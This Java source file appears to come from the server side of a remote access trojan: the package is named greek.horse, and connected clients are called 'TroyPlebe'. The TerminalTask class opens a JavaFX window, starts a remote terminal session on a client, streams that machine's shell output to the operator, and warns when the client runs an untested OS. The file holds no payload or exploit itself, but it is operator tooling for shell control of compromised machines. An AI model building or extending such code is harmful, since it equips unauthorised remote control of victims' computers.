package greek.horse.server.ui.controllers.tasks;

import greek.horse.models.NetInfo;
import greek.horse.models.OS;
import greek.horse.server.troyStructure.TroyPlebe;
import greek.horse.server.troyStructure.request.RecurrentTroyRequest;
import greek.horse.server.ui.ChatApp;
import greek.horse.server.ui.controllers.TerminalController;
import javafx.application.Platform;
import javafx.collections.ListChangeListener;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.stage.Modality;
import javafx.stage.Stage;
import org.apache.log4j.Logger;

import java.io.IOException;
import java.util.concurrent.atomic.AtomicBoolean;

public class TerminalTask implements Runnable {

    private final TroyPlebe plebe;
    private TerminalController controller;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private static final Logger log = Logger.getLogger(TerminalTask.class);

    public TerminalTask(TroyPlebe tp) {
        this.plebe = tp;
    }

    @Override
    public void run() {
        AtomicBoolean start = new AtomicBoolean(false);

        Platform.runLater(() -> {
            try {
                Stage stage = new Stage();
                stage.setTitle("Terminal - " + plebe.getTitle());
                stage.getIcons().add(ChatApp.appIcon);

                FXMLLoader loader = new FXMLLoader(getClass().getClassLoader().getResource("scenes/terminal.fxml"));
                Parent root = loader.load();

                stage.setOnCloseRequest(e -> this.running.set(false));

                Scene scene = new Scene(root);
                stage.setScene(scene);

                controller = loader.getController();
                controller.setPlebe(plebe);
                controller.setStage(stage);

                stage.show();

            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                start.set(true);
            }
        });

        while (!start.get()) {
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        warnPlatformDependency();
        controller.begin();

        RecurrentTroyRequest request = (RecurrentTroyRequest) this.plebe.startTerminal();

        request.getObservableReceivedObjs().addListener((ListChangeListener<? super Object>) listener -> {
            listener.next();

            for (Object obj : listener.getAddedSubList()) {
                String line = (String) obj;
                controller.addTextLine(line);
            }

        });

        while (plebe.getRunning().get() && this.running.get()) {
            try {
                Thread.sleep(200);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        if (!request.getReleased().get()) {
            this.plebe.releaseRequest(request);
        }

        Platform.runLater(() -> {
            controller.getStage().hide();
        });
    }

    private void warnPlatformDependency() {
        try {
            NetInfo netInfo = (NetInfo) this.plebe.getNetInfo().getReceivedObj();
            OS os = netInfo.getOs();
//            if (os.equals(OS.WINDOWS) || os.equals(OS.UNIX)) {
//                return;
//            }
            Platform.runLater(() -> {
                Alert alert = new Alert(Alert.AlertType.WARNING);
                alert.setTitle("Warning");
                alert.initOwner(controller.getStage());
                alert.initModality(Modality.APPLICATION_MODAL);

                alert.setHeaderText("Platform dependency");
                alert.setContentText("Only Windows and UNIX systems were tested. Be aware: this Plebe is running '" + os + "'.");
                alert.showAndWait();
            });
        } catch (Exception e) {
            log.error(e);
        }
    }

    public AtomicBoolean getRunning() {
        return running;
    }
}
